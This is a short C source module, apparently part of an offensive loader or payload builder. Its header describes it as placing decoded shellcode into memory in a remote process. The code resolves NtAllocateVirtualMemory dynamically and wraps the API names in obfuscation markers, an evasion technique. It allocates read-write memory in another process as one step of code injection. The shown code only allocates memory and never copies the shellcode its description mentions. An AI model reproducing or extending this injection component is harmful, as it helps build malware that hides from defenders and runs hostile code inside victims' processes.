// Description: Copy decoded shellcode to RW mem in remote process using Dyn resolved NtAllocateVirtualMemory
// Used WinAPIs: GetProcAddress GetModuleHandle
// IOCS strings:

#include <winternl.h>

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

LPVOID AllocMemory(HANDLE process, SIZE_T size) {
    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t) GetProcAddress(GetModuleHandle(<obf>"NTDLL.DLL"<ob_end>), <obf>"NtAllocateVirtualMemory"<ob_end>);

    if (pNtAllocateVirtualMemory == NULL) {
        #ifdef DEBUG
            printf("[-] GetProcAddress for NtAllocateVirtualMemory failed (%d)\n", GetLastError());
        #endif
        return NULL;
    }

    PVOID baseAddress = NULL;
    NTSTATUS status = pNtAllocateVirtualMemory(process, &baseAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        #ifdef DEBUG
            printf("[-] NtAllocateVirtualMemory failed (%08x)\n", status);
        #endif
        return NULL;
    }

    return baseAddress;
}
